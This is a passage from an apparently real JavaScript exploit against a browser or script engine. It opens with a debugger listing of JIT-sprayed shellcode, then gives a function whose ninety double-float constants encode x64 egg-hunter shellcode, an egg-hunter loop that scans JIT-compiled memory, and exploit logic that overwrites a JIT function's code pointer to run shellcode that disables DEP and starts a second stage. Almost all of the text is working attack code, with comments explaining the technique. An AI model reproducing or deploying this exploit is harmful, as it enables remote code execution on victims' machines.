000002C6944D4B48 | 41414141:0000            | add byte ptr ds:[r8],al          <- JIT sprayed egg double
000002C6944D4B4E | 0000                     | add byte ptr ds:[rax],al                
000002C6944D4B50 | 90                       | nop                              <- JIT sprayed shellcode begins here
000002C6944D4B51 | 90                       | nop                                     
000002C6944D4B52 | 55                       | push rbp                                
000002C6944D4B53 | 48:89E5                  | mov rbp,rsp                             
000002C6944D4B56 | 48:83EC 40               | sub rsp,40                              
000002C6944D4B5A | 48:83EC 08               | sub rsp,8                               
000002C6944D4B5E | 40:80E4 F7               | and spl,F7                              
000002C6944D4B62 | 48:B8 1122334455667788   | mov rax,8877665544332211                
000002C6944D4B6C | 48:8945 C8               | mov qword ptr ss:[rbp-38],rax           
000002C6944D4B70 | 48:C7C1 884E0D00         | mov rcx,D4E88                           
000002C6944D4B77 | E8 F9000000              | call 2C6944D4C75                        

This then introduces another constaint on JIT spraying beyoond forcing your
assembly bytecode to be 100% valid double floats. You are also limited to a
maximum of 100 doubles (800 bytes) including your egg prefix.

The x64 ASM source code behind this egg hunter can be found at: https://github.com/forrest-orr/Exploits/blob/main/Payloads/Source/DoubleStar/Stage1_EggHunter/Egghunter64.asm
*/

function JITSprayFunc(){
    Egg = 5.40900888e-315; // AAAA\x00\x00\x00\x00
    X1 = 58394.27801956298;
    X2 = -3.384548150597339e+269;
    X3 = -9.154525457562153e+192;
    X4 = 4.1005939302288804e+42;
    X5 = -5.954550387086224e-264;
    X6 = -6.202600667005017e-264;
    X7 = 3.739444822644755e+67;
    X8 = -1.2650161464211396e+258;
    X9 = -2.6951286493033994e+35;
    X10 = 1.3116505146398627e+104;
    X11 = -1.311379727091241e+181;
    X12 = 1.1053351980286266e-265;
    X13 = 7.66487078033362e+42;
    X14 = 1.6679557218696946e-235;
    X15 = 1.1327634929857868e+27;
    X16 = 6.514949632148056e-152;
    X17 = 3.75559130646382e+255;
    X18 = 8.6919639111614e-311;
    X19 = -1.0771492276655187e-142;
    X20 = 1.0596460749348558e+39;
    X21 = 4.4990090566228275e-228;
    X22 = 2.6641556100123696e+41;
    X23 = -3.695293685173417e+49;
    X24 = 7.675324624976707e-297;
    X25 = 5.738262935249441e+40;
    X26 = 4.460149175031513e+43;
    X27 = 8.958658002980807e-287;
    X28 = -1.312880373645135e+35;
    X29 = 4.864674571015197e+42;
    X30 = -2.500435320470142e+35;
    X31 = -2.800945285957394e+277;
    X32 = 1.44103957698964e+28;
    X33 = 3.8566513062216665e+65;
    X34 = 1.37405680231e-312;
    X35 = 1.6258034990195507e-191;
    X36 = 1.5008582713363865e+43;
    X37 = 3.1154847750709123;
    X38 = -6.809578792021008e+214;
    X39 = -7.696699288147737e+115;
    X40 = 3.909631192677548e+112;
    X41 = 1.5636948002514616e+158;
    X42 = -2.6295656969507476e-254;
    X43 = -6.001472476578534e-264;
    X44 = 9.25337251529007e-33;
    X45 = 4.419915842157561e-80;
    X46 = 8.07076629722016e+254;
    X47 = 3.736523284e-314;
    X48 = 3.742120352320771e+254;
    X49 = 1.0785207713761078e-32;
    X50 = -2.6374368557341455e-254;
    X51 = 1.2702053652464168e+145;
    X52 = -1.3113796337500435e+181;
    X53 = 1.2024564583763433e+111;
    X54 = 1.1326406542153807e+104;
    X55 = 9.646933740426927e+39;
    X56 = -2.5677414592270957e-254;
    X57 = 1.5864445474697441e+233;
    X58 = -2.6689139052065564e-251;
    X59 = 1.0555057376604044e+27;
    X60 = 8.364524068863995e+42;
    X61 = 3.382975178824556e+43;
    X62 = -8.511722322449098e+115;
    X63 = -2.2763239573787572e+271;
    X64 = -6.163839243926498e-264;
    X65 = 1.5186209005088964e+258;
    X66 = 7.253360348539147e-192;
    X67 = -1.2560830051206045e+234;
    X68 = 1.102849544e-314;
    X69 = -2.276324008154652e+271;
    X70 = 2.8122150524016884e-71;
    X71 = 5.53602304257365e-310;
    X72 = -6.028598990540894e-264;
    X73 = 1.0553922879130128e+27;
    X74 = -1.098771600725952e-244;
    X75 = -2.5574368247075522e-254;
    X76 = 3.618778572061404e-171;
    X77 = -1.4656824334476123e+40;
    X78 = 4.6232700581905664e+42;
    X79 = -3.6562604268727894e+125;
    X80 = -2.927408487880894e+78;
    X81 = 1.087942540606703e-309;
    X82 = 6.440226123500225e+264;
    X83 = 3.879424446462186e+148;
    X84 = 3.234472631797124e+40;
    X85 = 1.4186706350383543e-307;
    X86 = 1.2617245769382784e-234;
    X87 = 1.3810793979336581e+43;
    X88 = 1.565026152201332e+43;
    X89 = 5.1402745833993635e+153;
    X90 = 9.63e-322;
}

function EggHunter(TargetAddressDbl) {
    var ScanPtr = TargetAddressDbl;

    for(var i = 0; i < 1000; i++) { // 1000 QWORDs give me the most stable result. The more double float constants are in the JIT'd function, the more handler code seems to precede them.
        HelperDbl[0] = ScanPtr;
        var DblVal = ExplicitLeakDbl(ScanPtr); // The JIT'd ASM code being scanned is likely to contain 8 byte sequences which will not be interpreted as doubles (and will have tagged pointer bits set). Use explicit/strong primitive for these reads.
        
        if(DblVal == 5.40900888e-315) {
            HelperDbl[0] = ScanPtr;
            HelperDword[0] = HelperDword[0] + 8; // Skip over egg bytes and return precise pointer to the shellcode
            return HelperDbl[0];
        }
        
        HelperDbl[0] = ScanPtr;
        HelperDword[0] = HelperDword[0] + 8;
        ScanPtr = HelperDbl[0];
    }
    
    return 0.0;
}

////////
////////
// Primary high level exploit logic
////////

function Exploit() {
    for(var i = 0; i < JITIterations; i++) {
        JITSprayFunc(); // JIT spray the shellcode to a private +RX region of virtual memory
    }

    var JITCodePtr = GetJSFuncJITCodePtr(JITSprayFunc);
    
    if(JITCodePtr) {
        // Setup the strong read primitive for the stage one egg hunter: attempting to interpret assembly byte code as doubles via weak primitive may crash the process (tagged pointer bits could cause the read value to be dereferenced as a pointer)
        
        HelperDbl[0] = JITCodePtr;
        DebugLog("JIT spray code pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        InitStrongReadPrimitive();
        ShellcodeAddress = EggHunter(JITCodePtr); // For this we need the strong read primitive since values here can start with 0xffff and thus act as tags

        if(ShellcodeAddress) {
            // Trigger code exec by calling the JIT sprayed function again. Its code pointer has been overwritten to now point to the literal shellcode data within the JIT'd function
            
            HelperDbl[0] = ShellcodeAddress;
            DebugLog("Shellcode pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            var JITInfoAddress = GetJSFuncJITInfoPtr(JITSprayFunc);
            WeakWriteDbl(JITInfoAddress, ShellcodeAddress);
            JITSprayFunc(); // Notably the location of the data in the stage two shellcode Uint8Array can be found at offset 0x40 from the start of the array object when the array is small, and when it is large (as in the case of the WPAD shellcode) a pointer to it can be found at offset 0x38 from the start of the array object. In this case though, the stage one egg hunter shellcode finds, disables DEP and ADDITIONALLY executes the stage two shellcode itself, so there is no reason to locate/execute it from JS.
        }
        else {
            DebugLog("Failed to resolve shellcode address");
        }
    }
}

Exploit();

